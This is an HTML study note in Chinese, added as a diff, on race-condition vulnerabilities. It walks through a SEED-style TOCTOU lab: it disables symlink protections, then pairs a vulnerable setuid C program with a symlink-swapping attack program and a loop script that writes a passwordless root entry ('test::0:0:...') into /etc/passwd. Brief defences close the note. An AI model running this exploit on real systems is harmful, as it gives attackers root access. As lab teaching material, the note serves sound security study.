@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># 竞争条件,竞争条件</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>竞争条件</h1>
+<h2>1.基本概念</h2>
+<p>多个线程/进程并发执行时，可能会访问或者操作统一资源，而执行结果取决于执行顺序，故存在竞争条件</p>
+<h2>2.文件系统竞争条件漏洞示例</h2>
+<p>环境准备：关闭操作系统保护措施：</p>
+<pre><code class="language-shell"># 禁止随意追踪处于所有人都可写入的目录中的链接，如/tmp
+$ sudo sysctl -w fs.protected_symlinks=0
+# 禁止 root 写处于/tmp 中属于其他人的文件
+$ sudo sysctl -w fs.protected_regular=0
+</code></pre>
+<p>示例程序：vul.c，并 <code>sudo chown root vul; sudo chmod u+s vul</code></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+int main()
+{
+ char * fn = &quot;/tmp/XYZ&quot;;
+ char buffer[60];
+ FILE *fp;
+ /* get user input */
+ scanf(&quot;%50s&quot;, buffer );
+ if(!access(fn, W_OK)){
+     fp = fopen(fn, &quot;a+&quot;);
+     fwrite(&quot;\n&quot;, sizeof(char), 1, fp);
+     fwrite(buffer, sizeof(char), strlen(buffer), fp);
+     fclose(fp);
+ }
+ else printf(&quot;No permission \n&quot;);
+}
+</code></pre>
+<p>访问文件与打开文件并非原子性操作，所以存在竞争条件，那么我们就需要利用中间的时间片修改 fn 指针指向的文件，这里采取符号链接的方式</p>
+<p>attack_process.c：后台运行，创建对应符号链接，并不断交换 XYZ 和 ABC 文件</p>
+<p>link：创建一个硬链接</p>
+<p>symlink：用于创建一个软链接</p>
+<p>unlink：删除软链接，硬链接或文件</p>
+<pre><code class="language-c">#define _GNU_SOURCE
+
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+
+int main()
+{
+  unsigned int flags = RENAME_EXCHANGE;
+
+  unlink(&quot;/tmp/XYZ&quot;);
+  symlink(&quot;/dev/null&quot;, &quot;/tmp/XYZ&quot;);
+  unlink(&quot;/tmp/ABC&quot;);
+  symlink(&quot;/etc/passwd&quot;, &quot;/tmp/ABC&quot;);
+   
+  while(1) {
+    renameat2(0, &quot;/tmp/XYZ&quot;, 0, &quot;/tmp/ABC&quot;, flags);   
+  }
+
+  return 0;
+}
+
+# gcc -o attack_process attack_process.c
+</code></pre>
+<p>./target_process.sh：不断执行 vul 文件并检查其时间戳，并正好在/tmp/XYZ 符号链接到/etc/passwd 时以 root 权限写入特权用户</p>
+<pre><code class="language-shell">#!/bin/bash
+CHECK_FILE=&quot;ls -l /etc/passwd&quot;
+old=$($CHECK_FILE)
+new=$($CHECK_FILE)
+while  [ &quot;$old&quot; == &quot;$new&quot; ]
+do
+        ./vul &lt; passwd_input
+        new=$($CHECK_FILE)
+done
+echo &quot;STOP... The passwd file has been changed&quot;
+</code></pre>
+<p>利用文件系统的竞争条件，passwd_input 文件中写入 <code>test::0:0:test:/root:/bin/bash</code>, 密码也可以是一个无密码账户的魔法值：<code>U6aMy0wojraho</code>，在/etc/passwd 中添加一个 root 用户 test</p>
+<h2>3.防护</h2>
+<p>使用原子性操作，将检查与使用放到同一个操作当中</p>
+<p>锁，信号量</p>
+
+        </main>
+    </div>
+</body>
+</html>
